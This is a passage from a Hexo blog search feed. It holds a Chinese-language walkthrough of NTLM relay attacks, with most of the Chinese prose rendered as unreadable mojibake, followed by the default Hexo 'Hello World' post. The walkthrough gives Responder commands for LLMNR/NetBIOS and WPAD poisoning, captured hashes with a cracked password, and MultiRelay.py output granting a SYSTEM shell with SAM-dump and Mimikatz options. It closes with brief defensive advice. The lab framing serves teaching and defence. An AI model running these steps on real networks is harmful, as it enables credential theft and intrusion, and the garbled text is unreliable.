å¤´ä¸­æå–è¿™äº›æ¶ˆæ¯ï¼Œå¹¶åœ¨å…¶ä»–åè®®ä¸­ä½¿ç”¨å®ƒä»¬ï¼Œæ¯”å¦‚ SMBã€‚</p><blockquote><p>NTLMæ”¯æŒå¤šç§åè®®ï¼Œä¾‹å¦‚SMBã€HTTP(S)ã€LDAPã€IMAPã€SMTPã€POP3å’ŒMSSQLã€‚</p></blockquote><p>æ ¹æ®ä¸Šæ–‡æåˆ°çš„å·¥ä½œç»„ç¯å¢ƒå’ŒåŸŸç¯å¢ƒçš„ç½‘ç»œè®¤è¯è¿‡ç¨‹ï¼Œå¯å®ç°NTLMä¸­ç»§ï¼Œè·å–ä½æƒé™ä¸»æœºçš„shell</p><p>ä¸­ç»§åˆ° SMB æ˜¯ä¸€ç§å…¸å‹çš„æ”»å‡»æ‰‹æ³•ã€‚è¿™ç§æ”»å‡»ä¼šä¸­ç»§åˆ° SMB å…è®¸æ”»å‡»è€…åœ¨ç¦ç”¨ SMB ç­¾åçš„ä¸»æœºä¸Šæ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚æœè¢«ä¸­ç»§çš„ç”¨æˆ·åœ¨è¯¥ä¸»æœºä¸Šå…·æœ‰ç®¡ç†ç‰¹æƒã€‚åˆ©ç”¨Responderä¸­Multi-relayæ¨¡å—ï¼Œå…è®¸æ”»å‡»è€…ä¸å…±äº«è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ï¼Œå®ƒå°†ç”Ÿæˆä¸€ä¸ªæœ¬åœ° TCP shell è¿›è¡Œè¿æ¥ã€‚</p><h2 id="0x06-responderä»‹ç»"><a class="markdownIt-Anchor" href="#0x06-responderä»‹ç»"></a> 0x06 Responderä»‹ç»</h2><p>Responderæ˜¯ç›‘å¬LLMNRå’ŒNetBIOSåè®®çš„å·¥å…·ä¹‹ä¸€ï¼Œèƒ½å¤ŸæŠ“å–ç½‘ç»œä¸­æ‰€æœ‰çš„LLMNRå’ŒNetBIOSè¯·æ±‚å¹¶è¿›è¡Œå“åº”ï¼Œè·å–æœ€åˆçš„è´¦æˆ·å‡­è¯ã€‚ Responderä¼šåˆ©ç”¨å†…ç½®SMBè®¤è¯æœåŠ¡å™¨ã€MSSQLè®¤è¯æœåŠ¡å™¨ã€HTTP è®¤è¯æœåŠ¡å™¨ã€HTTPSè®¤è¯æœåŠ¡å™¨ã€LDAPè®¤è¯æœåŠ¡å™¨ï¼ŒDNSæœåŠ¡å™¨ã€ WPADä»£ç†æœåŠ¡å™¨ï¼Œä»¥åŠFTPã€POP3ã€IMAPã€SMTPç­‰æœåŠ¡å™¨ï¼Œæ”¶é›†ç›®æ ‡ç½‘ç»œä¸­çš„æ˜æ–‡å‡­æ®ï¼Œè¿˜å¯ä»¥é€šè¿‡Multi-RelayåŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤ã€‚</p><p>Githubåœ°å€:</p><blockquote><p><a href="https://github.com/SpiderLabs/Responder">SpiderLabs/Responder: Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. (github.com)</a></p></blockquote><p>kaliä¸­å†…ç½®Responder</p><img align = "left" src = "https://i.loli.net/2021/08/03/tapnIxs28lKghY4.png" style="zoom:80%;" ><blockquote><p><strong>ResponderåŸç†æœ¬è´¨åœ¨äºå—å®³æœºç›‘å¬åŒåŸŸå†…ä¸­æ‰€æœ‰ä¸»æœºçš„å¹¿æ’­è¯·æ±‚ï¼Œå¹¶ä¸”ä¼ªé€ åº”ç­”(poisoning)ï¼Œè¾¾åˆ°æˆªå–hashå€¼çš„ç›®çš„</strong>ã€‚</p></blockquote><hr /><h1 id="æ”»å‡»æ¼”ç¤º"><a class="markdownIt-Anchor" href="#æ”»å‡»æ¼”ç¤º"></a> æ”»å‡»æ¼”ç¤º</h1><p><strong>æµ‹è¯•ç¯å¢ƒï¼š</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">kali(è¢«æ§ä¸»æœº) :  172.16.56.130<br><br>â€‹windows <span class="hljs-number">7</span> : 172.16.56.11<br><br>â€‹windows server <span class="hljs-number">2008</span> R2 (DC) : 172.16.56.10<br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨llmnrå’Œnetbiosæˆªå–net-ntlm-hash"><a class="markdownIt-Anchor" href="#åˆ©ç”¨llmnrå’Œnetbiosæˆªå–net-ntlm-hash"></a> åˆ©ç”¨LLMNRå’ŒNetBIOSæˆªå–Net-NTLM Hash</h2><blockquote><p>ä¸¤å°åŸŸå†…ä¸»æœºé»˜è®¤å¼€å¯LLMNRå’ŒNetBIOSåç§°æœåŠ¡</p></blockquote><p>å¯¹äºSMBåè®®ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥æœåŠ¡ç«¯æ—¶ï¼Œé»˜è®¤å…ˆä½¿ç”¨æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç hashå°è¯•ç™»å½•ï¼Œæ‰€ä»¥ å¯ä»¥æ¨¡æ‹ŸSMBæœåŠ¡å™¨ä»è€Œæˆªè·hashï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤éƒ½å¯ä»¥å¾—åˆ°hashã€‚</p><p><strong>1. å¼€å¯ç›‘å¬</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -f<br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/U8a9ND6FxmdAkuI.png" alt="_20210803102000" style="zoom:80%;" /><p><strong>2. win7æ“ä½œ</strong></p><blockquote><p>åœ¨ç½‘ç»œä¸Šè¿æ¥ä¸€ä¸ªæ— æ³•è§£æçš„åŸŸå</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\whoami<br></code></pre></td></tr></table></figure></blockquote><img align = "left" src="https://i.loli.net/2021/08/03/Gulv2Pp5fYkD1R3.png" alt="_20210803103047" /><p>æˆªè·çš„Hashå€¼</p><img align = "left" src="https://i.loli.net/2021/08/03/8WlvOwYzhItKy1V.png" alt="_20210803103407" style="zoom:80%;" /><blockquote><p>Responderä¼šå°†æ‰€æœ‰æŠ“å–åˆ°çš„æ•°æ®å­˜å‚¨åˆ° /usr/share/responder/logs/ æ–‡ä»¶å¤¹ä¸‹ï¼Œä¼šä¸ºæ¯ä¸ªservice-proto-IPç”Ÿæˆ å”¯ä¸€çš„æ–‡ä»¶ã€‚ä½¿ç”¨responderæŠ“å–çš„é€šå¸¸å°±æ˜¯Net-NTLM Hashã€‚æ”»å‡»è€…æ— æ³•ä½¿ç”¨Net-NTLM Hashè¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œåªèƒ½ä½¿ç”¨hashcatã€Johnç­‰å·¥å…·çˆ†ç ´æˆ–è¿›è¡Œ NTLM-Relayæ”»å‡»ã€‚</p></blockquote><p><strong>3. ä½¿ç”¨å·¥å…·è¿›è¡Œçˆ†ç ´</strong></p><img align = "left" src="https://i.loli.net/2021/08/03/Q1kIBTSErnuM3tb.png" alt="_20210803104656" style="zoom:80%;" /><p>å¾—åˆ°æ˜æ–‡å¯†ç 010612å’Œç”¨æˆ·åJohn</p><h2 id="åˆ©ç”¨wpadåŠ«æŒè·å¾—net-ntlm-hash"><a class="markdownIt-Anchor" href="#åˆ©ç”¨wpadåŠ«æŒè·å¾—net-ntlm-hash"></a> åˆ©ç”¨WPADåŠ«æŒè·å¾—Net-NTLM Hash</h2><blockquote><p>Responderå¯ä»¥åˆ›å»ºä¸€ä¸ªå‡WPADæœåŠ¡å™¨ï¼Œå¹¶å“åº”å®¢æˆ·ç«¯çš„WPADåç§°è§£æã€‚ ç„¶åå®¢æˆ·ç«¯è¯·æ±‚è¿™ä¸ªå‡WPAD æœåŠ¡å™¨çš„wpad.datæ–‡ä»¶ã€‚</p></blockquote><p><strong>1. åˆ›å»ºWPADæœåŠ¡å™¨å¹¶å¼€å¯ç›‘å¬</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -v -w -F<br></code></pre></td></tr></table></figure><p><strong>2. win7æ“ä½œ</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">å¼€å¯WPADä»£ç†åè®¿é—®ç½‘é¡µå¹¶ç™»é™†<br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/jzO4EcX3Jr9d5xB.png" alt="_20210803110048" style="zoom: 80%;" /><p>æˆªå–çš„Hashå€¼</p><img align = "left" src="https://i.loli.net/2021/08/03/vlKJNuywSZckYVP.png" alt="_20210803110309" style="zoom:80%;" /><h2 id="smb-relay"><a class="markdownIt-Anchor" href="#smb-relay"></a> SMB Relay</h2><p>åˆ©ç”¨Responder/tools/MultiRelay.pyå¯å®ç°NTLMè®¤è¯ä¸­ç»§åˆ°SMBä¸­å»</p><p><strong>1. ä¿®æ”¹Responder.confæ–‡ä»¶å…³é—­HTTPå’ŒSMBæœåŠ¡å™¨</strong></p><img align = "left" src="https://i.loli.net/2021/08/03/1HmLPjrKpcZulXO.png" alt="æˆªå›¾_é€‰æ‹©åŒºåŸŸ_20210803143821" style="zoom:80%;" /><p><strong>2. æŸ¥çœ‹åŸŸå†…SMBç­¾åå¼€å¯çŠ¶å†µ</strong></p><img align = "left" src="https://i.loli.net/2021/08/03/ECkNToiMGDLbFKP.png" alt="æˆªå›¾_é€‰æ‹©åŒºåŸŸ_20210803143431" style="zoom:80%;" /><p><strong>2. å¼€å¯ç›‘å¬</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> eth0 -v <br></code></pre></td></tr></table></figure><p><strong>3. æ–°å»ºç»ˆç«¯ï¼Œè¿è¡ŒMultiRelay.pyè„šæœ¬</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> MultiRelay.py -t <span class="hljs-number">172.16.56.11</span> -u <span class="hljs-literal">ALL</span><br></code></pre></td></tr></table></figure><p><strong>4. win sever 2008 æ“ä½œ</strong></p><blockquote><p>éšä¾¿ä¸Šä¼ ç‚¹SMBæµé‡ ğŸ˜„</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\wuqian<br></code></pre></td></tr></table></figure></blockquote><p><strong>æ‹¿åˆ°win7çš„shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(rootğŸ’€kali)-[/usr/share/responder/tools]<br>â””â”€# python3 MultiRelay.py -t 172.16.56.11 -u ALL<br><br>Responder MultiRelay 2.5 NTLMv1/2 Relay<br><br>Send bugs/hugs/comments to: laurent.gaffie@gmail.com<br>Usernames to relay (-u) are case sensitive.<br>To kill this script hit CTRL-C.<br><br>/*<br>Use this script in combination with Responder.py for best results.<br>Make sure to set SMB and HTTP to OFF in Responder.conf.<br><br>This tool listen on TCP port 80, 3128 and 445.<br>For optimal pwnage, launch Responder only with these 2 options:<br>-rv<br>Avoid running a command that will likely prompt for information like net use, etc.<br>If you do so, use taskkill (as system) to kill the process.<br>*/<br><br>Relaying credentials for these users:<br>[&#x27;ALL&#x27;]<br><br><br>Retrieving information for 172.16.56.11...<br>SMB signing: False<br>Os version: &#x27;Windows 7 Professional 7601 Service Pack 1&#x27;<br>Hostname: &#x27;JOHN-PC&#x27;<br>Part of the &#x27;CORP&#x27; domain<br>[+] Setting up SMB relay with SMB challenge: 2a92d665043bd7d4<br>[+] Received NTLMv2 hash from: 172.16.56.10 <br>[+] Client info: [&#x27;eWindows Server 2008 HPC Edition 7601 Service Pack 1&#x27;, domain: &#x27;CORP&#x27;, signing:&#x27;False&#x27;]                                                                          <br>[+] Username: Administrator is whitelisted, forwarding credentials.<br>[+] SMB Session Auth sent.<br>[+] Looks good, Administrator has admin rights on C$.<br>[+] Authenticated.<br>[+] Dropping into Responder&#x27;s interactive shell, type &quot;exit&quot; to terminate<br><br>Available commands:<br>dump               -&gt; Extract the SAM database and print hashes.<br>regdump KEY        -&gt; Dump an HKLM registry key (eg: regdump SYSTEM)<br>read Path_To_File  -&gt; Read a file (eg: read /windows/win.ini)<br>get  Path_To_File  -&gt; Download a file (eg: get users/administrator/desktop/password.txt)<br>delete Path_To_File-&gt; Delete a file (eg: delete /windows/temp/executable.exe)<br>upload Path_To_File-&gt; Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \windows\temp\<br>runas  Command     -&gt; Run a command as the currently logged in user. (eg: runas whoami)<br>scan /24           -&gt; Scan (Using SMB) this /24 or /16 to find hosts to pivot to<br>pivot  IP address  -&gt; Connect to another host (eg: pivot 10.0.0.12)<br>mimi  command      -&gt; Run a remote Mimikatz 64 bits command (eg: mimi coffee)<br>mimi32  command    -&gt; Run a remote Mimikatz 32 bits command (eg: mimi coffee)<br>lcmd  command      -&gt; Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)<br>help               -&gt; Print this message.<br>exit               -&gt; Exit this shell and return in relay mode.<br>                      If you want to quit type exit and then use CTRL-C<br><br>Any other command than that will be run as SYSTEM on the target.<br><br>Connected to 172.16.56.11 as LocalSystem.<br>C:\Windows\system32\:#<br></code></pre></td></tr></table></figure><img align = "left" src="https://i.loli.net/2021/08/03/i2Tfg17PoLZIbSX.png" alt="æˆªå›¾_é€‰æ‹©åŒºåŸŸ_20210803144439" style="zoom:80%;" /><h2 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“"></a> æ€»ç»“</h2><p>windowsçš„NTLMè®¤è¯åœ¨å¤šç§åè®®ä¾‹å¦‚HTTP,SMB,WPAD,MSSQLä¸­å¾—åˆ°å¹¿æ³›åº”ç”¨ï¼Œä½†è¯¥è®¤è¯å®‰å…¨æ€§ä¸èƒ½å¾—åˆ°ä¿è¯ï¼Œå¯é€šè¿‡ä¸­é—´äººæ”»å‡»è·å–Hashæˆ–è€…ä¸­ç»§è¾¾åˆ°åŸŸå†…æ¨ªå‘æ¸—é€ã€‚å¦‚ä½•é˜²èŒƒæ˜¯æˆ‘ä»¬å…³å¿ƒçš„é—®é¢˜</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.å…³é—­LLMNRä»¥åŠNetBIOSæœåŠ¡<br><span class="hljs-number">2</span>.å…³é—­WPADä»£ç†æœåŠ¡å™¨<br><span class="hljs-number">3</span>.å°†åŸŸå†…ä¸»æœº<span class="hljs-built_in">ip</span>æ·»åŠ åˆ°æœ¬åœ°hostsæ–‡ä»¶ä¸­<br><span class="hljs-number">4</span>.æ·»åŠ SMBç­¾å<br></code></pre></td></tr></table></figure><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> <strong>Reference</strong></h2><blockquote><p><a href="https://cloud.tencent.com/developer/news/476984">NTLM ä¸­ç»§æ”»å‡»çš„å‡ ç§éä¸»æµç©æ³• </a></p><p><a href="http://www.vuln.cn/6761">åˆ©ç”¨ LLMNR åç§°è§£æç¼ºé™·åŠ«æŒå†…ç½‘æŒ‡å®šä¸»æœºä¼šè¯ â€“ Her0in | æ¼æ´äººç”Ÿ (vuln.cn)</a></p><p><a href="http://www.vuln.cn/6762">åˆ©ç”¨ NetBIOS åè®®åç§°è§£æåŠ WPAD è¿›è¡Œå†…ç½‘æ¸—é€ â€“ Her0in | æ¼æ´äººç”Ÿ (vuln.cn)</a></p><p><a href="https://www.jianshu.com/p/9627962db4da">SMB relayæ”»å‡»å¤ç° - ç®€ä¹¦ (jianshu.com)</a></p><p><a href="https://www.redhatzone.com/ask/article/1459.html">æµ…æSMB relayæ”»å‡»æ‰‹æ³•_çº¢å¸½ç¤¾åŒº (redhatzone.com)</a></p><p><a href="https://www.freebuf.com/articles/network/244375.html">å†…ç½‘æ¸—é€æµ‹è¯•ï¼šNTLM Relayæ”»å‡»åˆ†æ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://www.jianshu.com/p/1b545a8b8b1e">å†…ç½‘æ¸—é€ä¹‹Responderä¸Net-NTML hash - ç®€ä¹¦ (jianshu.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/06/01/hello-world/"/>
    <url>/2022/06/01/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
